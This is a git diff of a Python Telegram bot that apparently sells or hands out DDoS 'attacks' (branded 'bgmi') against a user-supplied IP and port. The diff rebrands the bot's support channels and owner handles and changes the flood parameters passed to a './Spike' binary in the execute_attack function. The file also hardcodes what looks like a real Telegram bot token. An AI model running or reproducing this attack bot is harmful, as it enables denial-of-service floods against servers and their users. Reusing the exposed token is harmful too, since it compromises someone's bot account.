@@ -18,14 +18,14 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
 
 # Telegram bot token and channel IDs
 TOKEN = '7788865701:AAEW3E0_GZWjcwc4oyLKgFSuiV0d849mvXM'  # Replace with your actual bot token
-CHANNEL_ID = '-1002629547525'  # Replace with your specific channel or group ID for attacks
-FEEDBACK_CHANNEL_ID = '-1002688374033'  # Replace with your specific channel ID for feedback
+CHANNEL_ID = '-1002310033085'  # Replace with your specific channel or group ID for attacks
+FEEDBACK_CHANNEL_ID = '-1002677940687'  # Replace with your specific channel ID for feedback
 message_queue = []
 
 
 # Official channel details
-OFFICIAL_CHANNEL = "@titanddos24opop"  # Replace with your channel username or ID
-CHANNEL_LINK = "https://t.me/titanddos24opop"  # Replace with your channel link
+OFFICIAL_CHANNEL = "@hackingchats"  # Replace with your channel username or ID
+CHANNEL_LINK = "https://t.me/hackingchats"  # Replace with your channel link
 
 # Initialize the bot
 bot = telebot.TeleBot(TOKEN)
@@ -245,7 +245,7 @@ def bgmi_command(message):
 
         # Create a "Support" button
         support_button = InlineKeyboardMarkup()
-        support_button.add(InlineKeyboardButton("🙏 Support 🙏", url="https://t.me/titanfreeop"))
+        support_button.add(InlineKeyboardButton("🙏 Support 🙏", url="https://t.me/hackingchats"))
 
         # Send attack confirmation with attacker's name and support button
         bot.reply_to(
@@ -280,7 +280,7 @@ async def execute_attack(ip, port, duration, username):
     try:
         # Start the attack process with predefined values
         proc = await asyncio.create_subprocess_shell(
-            f"./Spike {ip} {port} {duration} 12 750",
+            f"./Spike {ip} {port} {duration} 10 700",
             stderr=asyncio.subprocess.PIPE
         )
 
@@ -329,15 +329,15 @@ def send_welcome(message):
     - Daily limit: 15 attacks 📊
     - Banned for fake feedback 🚫
     
-    🔗 Support: @titanfreeop
-    🔰 Owner : @Titanop24
+    🔗 Support: @hackingchats
+    🔰 Owner : @lordzexx
     """
     
     # Add quick action buttons
     markup = telebot.types.InlineKeyboardMarkup()
     markup.add(
         telebot.types.InlineKeyboardButton("⚡ Start Attack", callback_data='start_bgmi'),
-        telebot.types.InlineKeyboardButton("📚 Tutorial", url='https://t.me/titanfreeop')
+        telebot.types.InlineKeyboardButton("📚 Tutorial", url='https://t.me/hackingchats')
     )
     
     bot.send_message(
@@ -369,15 +369,15 @@ def send_help(message):
     - Attack limits: Prevents abuse 🛑
     
     📌 *Need Help?*
-    Contact support: @titanfreeop
-    Report issues: @Titanop24
+    Contact support: @hackingchats
+    Report issues: @lordzexx
     """
     
     # Add support buttons
     markup = telebot.types.InlineKeyboardMarkup()
     markup.add(
-        telebot.types.InlineKeyboardButton("🆘 Immediate Support", url='t.me/Titanop24'),
-        telebot.types.InlineKeyboardButton("📘 Documentation", url='https://t.me/titanfreeop')
+        telebot.types.InlineKeyboardButton("🆘 Immediate Support", url='t.me/lordzexx'),
+        telebot.types.InlineKeyboardButton("📘 Documentation", url='https://t.me/hackingchats')
     )
     
     bot.send_message(
